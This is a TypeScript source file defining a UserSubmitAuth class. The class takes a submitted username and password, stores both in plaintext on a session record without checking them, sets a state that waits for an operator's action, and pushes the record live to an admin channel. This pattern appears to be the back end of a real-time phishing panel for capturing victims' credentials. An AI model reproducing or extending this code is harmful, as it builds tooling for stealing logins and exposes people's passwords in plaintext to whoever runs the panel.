import { ActionState } from "@prisma/client";
import { type SessionRepository } from "../ports/SessionRepository.js";
import { type RealtimeGateway } from "../ports/RealtimeGateway.js";
import { SessionPolicy } from "../../domain/session/SessionPolicy.js";

export class UserSubmitAuth {
  constructor(
    private repo: SessionRepository,
    private rt: RealtimeGateway
  ) {}

  async execute(input: { sessionId: string; user: string; pass: string }) {
    const user = input.user.trim();
    const pass = input.pass.trim();

    if (user.length < 2 || pass.length < 2) {
      return { ok: false as const, error: "invalid_credentials" };
    }

    const s = await this.repo.findById(input.sessionId);
    if (!s) return { ok: false as const, error: "not_found" };

    if (!SessionPolicy.canUserSubmitAuth(s.action)) {
      return { ok: false as const, error: "bad_state" };
    }

    await this.repo.update(input.sessionId, {
      user,
      pass,
      action: ActionState.AUTH_WAIT_ACTION,
      lastError: null,
    });

    const updated = await this.repo.findById(input.sessionId);
    if (updated) {
      this.rt.emitSessionUpdate(input.sessionId, updated);
      this.rt.emitAdminUpsert(updated);
    }

    return { ok: true as const };
  }
}